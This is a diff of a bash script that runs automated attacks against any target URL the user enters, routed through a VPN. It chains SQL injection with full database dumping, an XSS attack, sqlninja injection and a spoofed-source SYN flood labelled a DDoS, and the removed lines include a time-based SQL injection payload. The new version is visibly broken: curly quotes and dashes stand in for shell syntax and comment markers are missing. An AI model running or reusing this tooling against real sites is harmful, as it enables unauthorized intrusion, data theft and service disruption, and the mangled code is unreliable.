@@ -29,26 +29,9 @@ install_tools() {
         ["uniscan"]="uniscan"
         ["whois"]="whois"
         ["subfinder"]="subfinder"
-        ["autorecon"]="autorecon"
-        ["coercer"]="coercer"
-        ["dploot"]="dploot"
-        ["getsploit"]="getsploit"
-        ["gowitness"]="gowitness"
-        ["horst"]="horst"
-        ["ligolo-ng"]="ligolo-ng"
-        ["mitm6"]="mitm6"
-        ["pspy"]="pspy"
-        ["pyinstaller"]="pyinstaller"
-        ["pyinstxtractor"]="pyinstxtractor"
-        ["sharpshooter"]="sharpshooter"
-        ["sickle"]="sickle"
-        ["snort"]="snort"
-        ["sploitscan"]="sploitscan"
-        ["vopono"]="vopono"
-        ["waybackpy"]="waybackpy"
         ["xsser"]="xsser"
         ["hping3"]="hping3"
-        ["metasploit"]="metasploit-framework"
+        ["sqlninja"]="sqlninja"
     )
 
     for tool in "${!tools[@]}"; do
@@ -152,8 +135,10 @@ perform_sql_injection() {
 perform_sqlmap_scan() {
     local target_url="$1"
     local results_dir="$2"
-    local cookies
-    read -p "Enter the cookies (if any): " cookies
+
+    local cookie_file="$results_dir/cookies.txt"
+    curl -c "$cookie_file" -s "$target_url" > /dev/null
+    local cookies=$(awk '{print $6"="$7}' "$cookie_file" | tail -n +2 | tr '\n' ';')
 
     local commands=(
         "--dbs"
@@ -177,11 +162,7 @@ perform_sqlmap_scan() {
     local file_count=1
     for command in "${commands[@]}"; do
         local result
-        if [ -z "$cookies" ]; then
-            result=$(run_command sqlmap -u "$target_url" $command)
-        else
-            result=$(run_command sqlmap -u "$target_url" --cookie="$cookies" $command)
-        fi
+        result=$(run_command sqlmap -u "$target_url" --cookie="$cookies" $command --batch --forms --crawl=2)
         local output_file="$results_dir/sqlmap_scan_${file_count}.txt"
         save_to_file "$output_file" "$result"
         echo "Saved SQLmap scan results to $output_file"
@@ -217,7 +198,7 @@ perform_uniscan_scan() {
 perform_whois_lookup() {
     local target_url="$1"
     local results_dir="$2"
-     local result
+    local result
     result=$(run_command whois "$target_url")
     local output_file="$results_dir/whois_lookup.txt"
     save_to_file "$output_file" "$result"
@@ -231,143 +212,118 @@ perform_subfinder_scan() {
     local result
     result=$(run_command subfinder -d "$target_url")
     local output_file="$results_dir/subfinder_scan.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved Subfinder scan results to $output_file"
+    save_to_file "$output_file" "$result“
+echo “Saved Subfinder scan results to $output_file”
 }
 
-# Function to perform an XSS attack
+Function to perform an XSS attack
+
 perform_xss_attack() {
-    local target_url="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command xsser -u "$target_url" --auto)
-    local output_file="$results_dir/xss_attack.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved XSS attack results to $output_file"
+local target_url=”$1”
+local results_dir=”$2”
+local result
+result=$(run_command xsser -u “$target_url” –auto)
+local output_file=”$results_dir/xss_attack.txt”
+save_to_file “$output_file” “$result”
+echo “Saved XSS attack results to $output_file”
 }
 
-# Function to perform a DDoS attack
+Function to perform a DDoS attack
+
 perform_ddos_attack() {
-    local target_url="$1"
-    local duration="$2"
-    local results_dir="$3"
-    local result
-    result=$(run_command hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source "$target_url")
-    local output_file="$results_dir/ddos_attack.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved DDoS attack results to $output_file"
+local target_url=”$1”
+local duration=”$2”
+local results_dir=”$3”
+local result
+result=$(run_command hping3 -c 10000 -d 120 -S -w 64 -p 80 –flood –rand-source “$target_url”)
+local output_file=”$results_dir/ddos_attack.txt”
+save_to_file “$output_file” “$result”
+echo “Saved DDoS attack results to $output_file”
 }
 
-# Function to access the database and download it
+Function to access the database and download it
+
 access_database() {
-    local target_url="$1"
-    local results_dir="$2"
-    local result
-    result=$(run_command sqlmap -u "$target_url" --dump-all --batch)
-    local output_file="$results_dir/database_dump.txt"
-    save_to_file "$output_file" "$result"
-    echo "Saved database dump to $output_file"
+local target_url=”$1”
+local results_dir=”$2”
+local result
+result=$(run_command sqlmap -u “$target_url” –dump-all –batch)
+local output_file=”$results_dir/database_dump.txt”
+save_to_file “$output_file” “$result”
+echo “Saved database dump to $output_file”
 }
 
-# Function to access seclists database
-access_seclists() {
-    echo "Seclists database accessed successfully."
+Function to perform an SQL injection using sqlninja
+
+perform_sqlninja_attack() {
+local target_url=”$1”
+local results_dir=”$2”
+local result
+result=$(run_command sqlninja -u “$target_url”)
+local output_file=”$results_dir/sqlninja_attack.txt”
+save_to_file “$output_file” “$result”
+echo “Saved sqlninja attack results to output_file”
 }
 
-# Function to perform custom SQL injection test
-perform_custom_sql_injection_test() {
-    local target_url="$1"
-    local results_dir="$2"
-    local url="${target_url}/login"
-    local login_url="${url}?username=admin' AND SLEEP(5)=0--&password=a"
-    local login_post="${url}?username=admin' AND SLEEP(5)=0--&password="
-    
-    # Start the timer
-    local start_time=$(date +%s)
-    
-    # Perform SQL injection
-    local response=$(curl -s "$login_url")
-    
-    # Check if the SQL injection was successful
-    if [[ "$response" == *"Database error"* ]]; then
-        echo "Vulnerability found!"
-        local end_time=$(date +%s)
-        local elapsed_time=$((end_time - start_time))
-        echo "Access time: $elapsed_time seconds"
-        local output_file="$results_dir/custom_sql_injection_test.txt"
-        save_to_file "$output_file" "Vulnerability found! Access time: $elapsed_time seconds"
-    else
-        echo "Vulnerability not found."
-        local output_file="$results_dir/custom_sql_injection_test.txt"
-        save_to_file "$output_file" "Vulnerability not found."
-    fi
-    
-    # Clean up variables (optional, not strictly necessary in Bash)
-    unset start_time end_time elapsed_time response login_url login_post url
-}
+Main function to orchestrate the security scans
 
-# Main function to orchestrate the security scans
 main() {
-    # Install necessary tools
-    install_tools
+# Install necessary tools
+install_tools
+# Print the animated header
+print_header
+
+# Clear the screen
+clear_screen
+
+# Get the target URL from the user
+read -p "Enter the target URL: " target_url
+
+# Create a results directory
+local results_dir="./results"
+mkdir -p "$results_dir"
+
+# Start Vopono VPN
+vopono start my_vpn
+
+# Check if the website is accessible
+if check_website_status "$target_url"; then
+    echo "Starting SQL Injection attempts..."
+    perform_sql_injection "$target_url" "$results_dir"
     
-    # Print the animated header
-    print_header
+    echo "Starting SQLmap scan..."
+    perform_sqlmap_scan "$target_url" "$results_dir"
     
-    # Clear the screen
-    clear_screen
+    echo "Starting FTP scan..."
+    perform_ftp_scan "$target_url" "$results_dir"
     
-    # Get the target URL from the user
-    read -p "Enter the target URL: " target_url
+    echo "Starting Uniscan scan..."
+    perform_uniscan_scan "$target_url" "$results_dir"
     
-    # Create a results directory
-    local results_dir="./results"
-    mkdir -p "$results_dir"
+    echo "Starting WHOIS lookup..."
+    perform_whois_lookup "$target_url" "$results_dir"
     
-    # Start Vopono VPN
-    vopono start my_vpn
+    echo "Starting Subfinder scan..."
+    perform_subfinder_scan "$target_url" "$results_dir"
     
-    # Check if the website is accessible
-    if check_website_status "$target_url"; then
-        echo "Starting SQL Injection attempts..."
-        perform_sql_injection "$target_url" "$results_dir"
-        
-        echo "Starting SQLmap scan..."
-        perform_sqlmap_scan "$target_url" "$results_dir"
-        
-        echo "Starting FTP scan..."
-        perform_ftp_scan "$target_url" "$results_dir"
-        
-        echo "Starting Uniscan scan..."
-        perform_uniscan_scan "$target_url" "$results_dir"
-        
-        echo "Starting WHOIS lookup..."
-        perform_whois_lookup "$target_url" "$results_dir"
-        
-        echo "Starting Subfinder scan..."
-        perform_subfinder_scan "$target_url" "$results_dir"
-        
-        echo "Starting XSS attack..."
-        perform_xss_attack "$target_url" "$results_dir"
-        
-        echo "Accessing the database and downloading it..."
-        access_database "$target_url" "$results_dir"
-        
-        echo "Starting custom SQL injection test..."
-        perform_custom_sql_injection_test "$target_url" "$results_dir"
-        
-        echo "Starting DDoS attack..."
-        perform_ddos_attack "$target_url" "60" "$results_dir"  # Run the DDoS attack for 60 seconds
-        
-        echo "Accessing Seclists database..."
-        access_seclists
-    else
-        echo "The website is not accessible. Exiting..."
-    fi
+    echo "Starting XSS attack..."
+    perform_xss_attack "$target_url" "$results_dir"
     
-    # Stop Vopono VPN
-    vopono stop
+    echo "Accessing the database and downloading it..."
+    access_database "$target_url" "$results_dir"
+    
+    echo "Starting SQL injection with sqlninja..."
+    perform_sqlninja_attack "$target_url" "$results_dir"
+    
+    echo "Starting DDoS attack..."
+    perform_ddos_attack "$target_url" "60" "$results_dir"  # Run the DDoS attack for 60 seconds
+else
+    echo "The website is not accessible. Exiting..."
+fi
+
+# Stop Vopono VPN
+vopono stop
+
 }
 
-# Run the main function
 main
